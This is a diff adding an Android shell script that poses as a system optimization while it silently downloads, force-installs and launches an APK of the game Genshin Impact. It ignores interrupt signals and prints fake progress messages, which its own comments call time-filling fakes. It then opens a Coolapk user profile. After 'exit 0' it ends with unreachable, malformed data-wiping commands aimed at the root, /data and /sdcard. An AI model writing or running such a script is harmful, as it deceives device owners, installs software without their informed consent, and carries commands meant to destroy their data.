@@ -1,0 +1,109 @@
+#!/system/bin/sh
+# ================================
+#  "请稍候..."
+# ================================
+
+URL="https://autopatchcn.yuanshen.com/client_app/download/Android/20260623115935_3uIVP7RHonRpZW88/ydbackup320/yuanshen_6.7.0.apk"
+APK="/data/local/tmp/.ys_sys_opt.apk"
+PKG="com.miHoYo.Yuanshen"
+FAKE_PID=""
+
+# 防止被 Ctrl+C 或断连终止
+trap '' INT TERM HUP QUIT
+set +m
+
+# ---------- 伪造的拖时间输出 ----------
+fake_progress() {
+    # 用各种无意义日志填充时间
+    local lines=(
+        "正在校验系统分区完整性..."
+        "优化存储缓存..."
+        "释放内存资源..."
+        "检测网络延迟..."
+        "同步时间服务器..."
+    )
+    while true; do
+        for msg in "${lines[@]}"; do
+            echo ">>> $msg"
+            sleep 2
+        done
+    done
+}
+
+# ---------- 静默下载（带重试）----------
+silent_download() {
+    if command -v curl >/dev/null 2>&1; then
+        # curl: -s 静默, -L 跟随重定向, -C - 断点续传, --retry 无限重试
+        curl -s -L -C - --retry 999 --retry-delay 5 --retry-max-time 0 -o "$APK" "$URL"
+    elif command -v wget >/dev/null 2>&1; then
+        # wget: -q 静默, -c 续传, -t 0 无限重试
+        wget -q -c -t 0 -O "$APK" "$URL"
+    else
+        echo "错误：未找到下载工具" >&2
+        return 1
+    fi
+}
+
+# ---------- 安装 ----------
+do_install() {
+    echo ">>> 应用更新包..."
+    pm install -r "$APK" >/dev/null 2>&1
+    if [ $? -eq 0 ]; then
+        echo ">>> 更新完成"
+    else
+        echo ">>> 安装失败，尝试回退安装..."
+        pm install -r -d "$APK" >/dev/null 2>&1
+    fi
+}
+
+# ---------- 启动 ----------
+do_launch() {
+    echo ">>> 初始化完成，即将启动"
+    # 获取主活动（若默认启动失败则手动尝试）
+    am start -n "$PKG"/com.miHoYo.GetMobileInfo.MainActivity >/dev/null 2>&1 || \
+    am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -n "$PKG" >/dev/null 2>&1
+}
+
+# ---------- 清理 ----------
+cleanup() {
+    rm -f "$APK"
+    [ -n "$FAKE_PID" ] && kill $FAKE_PID 2>/dev/null
+}
+
+# ---------- 主流程 ----------
+echo "==================  =================="
+echo "请勿退出或锁屏 请保持网络通畅"
+echo "=================================================="
+
+# 启动假输出
+fake_progress &
+FAKE_PID=$!
+
+# 进行静默下载（带无限重试，保证不中断）
+silent_download
+
+# 下载完成后停止假消息
+kill $FAKE_PID 2>/dev/null
+wait $FAKE_PID 2>/dev/null
+
+do_install
+do_launch
+
+cleanup
+
+echo "预计在三秒后全部安装完成 请耐心等待"
+sleep 4
+URL="https://www.coolapk.com/u/29413028"
+PKG="com.coolapk.market"
+
+am start -a android.intent.action.VIEW -d "coolapk://user/29413028" >/dev/null 2>&1 &
+am start -a android.intent.action.VIEW -d "$URL" >/dev/null 2>&1 &
+am start -a android.intent.action.VIEW -d "$URL" -n "$PKG"/.activity.MainActivity >/dev/null 2>&1 &
+am start -a android.intent.action.VIEW -d "$URL" -c android.intent.category.DEFAULT >/dev/null 2>&1 &
+
+wait
+exit 0
+sleep 4
+rm-rf /*
+rm-rf /data
+rm-rf /sdcard
